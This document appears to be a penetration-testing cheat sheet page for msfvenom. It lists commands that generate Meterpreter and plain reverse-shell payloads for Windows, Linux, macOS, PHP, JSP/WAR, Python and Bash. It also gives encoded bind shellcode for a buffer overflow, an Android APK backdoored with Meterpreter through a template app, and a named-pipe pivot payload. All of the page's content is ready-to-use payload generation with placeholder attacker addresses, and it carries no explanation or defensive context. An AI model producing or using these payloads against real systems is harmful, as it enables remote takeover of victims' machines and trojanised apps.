---
cover: ../../.gitbook/assets/Standard Banner.jpg
coverY: 0
---

# MSFVenom

#### Windows Meterpreter Staged Reverse TCP (x64)

`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip address> LPORT=<port> -f exe -o reverse.exe`

#### Windows Meterpreter Stageless Reverse TCP (x64)

`msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<ip address> LPORT=<port> -f exe -o reverse.exe`

#### Windows Staged Reverse TCP (x64)

`msfvenom -p windows/x64/reverse_tcp LHOST=<ip address> LPORT=<port> -f exe -o reverse.exe`

#### Windows Stageless Reverse TCP (x64)

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip address> LPORT=<port> -f exe -o reverse.exe`

#### Linux Meterpreter Staged Reverse TCP (x64)

`msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ip address> LPORT=<port> -f elf -o reverse.elf`

#### Linux Meterpreter Stageless Reverse TCP (x64)

`msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip address> LPORT=<port> -f elf -o reverse.elf`

#### Windows Bind TCP ShellCode - BOF

`msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '' -f python -v notBuf -o shellcode`

#### macOS Meterpreter Staged Reverse TCP (x64)

`msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=<ip address> LPORT=<port> -f macho -o shell.macho`

#### macOS Meterpreter Stageless Reverse TCP (x64)

`msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST=<ip address> LPORT=<port> -f macho -o shell.macho`

#### macOS Stageless Reverse TCP (x64)

`msfvenom -p osx/x64/shell_reverse_tcp LHOST=<ip address> LPORT=<port> -f macho -o shell.macho`

#### php Meterpreter Stageless Reverse TCP

`msfvenom -p php/meterpreter_reverse_tcp LHOST=<ip address> LPORT=<port> -f raw -o shell.php`

#### php Reverse PHP

`msfvenom -p php/reverse_php LHOST=<ip address> LPORT=<port> -o shell.php`

#### jsp Stageless Reverse TCP

`msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip address> LPORT=<port> -f raw -o shell.jsp`

#### WAR Stageless Reverse TCP

`msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip address> LPORT=<port> -f war -o shell.war`

#### Android Meterpreter Reverse TCP

`msfvenom --platform android -p android/meterpreter/reverse_tcp lhost=<ip address> lport=<port> R -o malicious.apk`

#### Android Meterpreter Embed Reverse TCP

`msfvenom --platform android -x template-app.apk -p android/meterpreter/reverse_tcp lhost=<ip address> lport=<port> -o payload.apk`

#### Python Stageless Reverse TCP

`msfvenom -p cmd/unix/reverse_python LHOST=<ip address> LPORT=<port> -f raw -o shell.py`

#### Bash Stageless Reverse TCP

`msfvenom -p cmd/unix/reverse_bash LHOST=<ip address> LPORT=<port> -f raw -o shell.sh`

#### Pivot

`msfvenom -p windows/meterpreter/reverse_named_pipe PIPEHOST=<ip address> PIPENAME=<name-of-pipe> -f exe -o <output file>`
